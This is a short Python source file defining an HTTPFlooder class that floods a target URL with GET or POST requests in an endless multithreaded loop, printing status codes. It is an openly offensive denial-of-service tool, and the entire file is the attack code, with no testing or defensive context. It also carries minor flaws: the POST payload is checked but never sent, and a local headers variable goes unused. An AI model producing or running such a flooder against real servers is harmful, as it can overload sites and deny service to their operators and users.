import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import Exceptions

SUPPORTED_METHODS = ['GET', 'POST']


class HTTPFlooder:
    def __init__(self, target, method='GET', threads_count=5, headers=None, payload=None, wait_for_response=True):
        if method not in SUPPORTED_METHODS:
            raise Exceptions.UnsupportedMethod
        if method == 'POST' and not payload:
            raise Exceptions.NoPayload
        self.active = True
        self.target = target
        self.method = method
        self.headers = headers
        self.threads_count = threads_count
        self.wait_for_response = wait_for_response

    def request_url(self):
        if not self.headers:
            headers = {}
        response = requests.request(self.method, self.target, headers=self.headers)
        return response.status_code

    def start_flood(self):
        self.active = True
        with ThreadPoolExecutor(max_workers=self.threads_count) as executor:
            while self.active:
                futures = [executor.submit(self.request_url) for z in range(self.threads_count + 1)]
                [print(futures.result()) for futures in futures]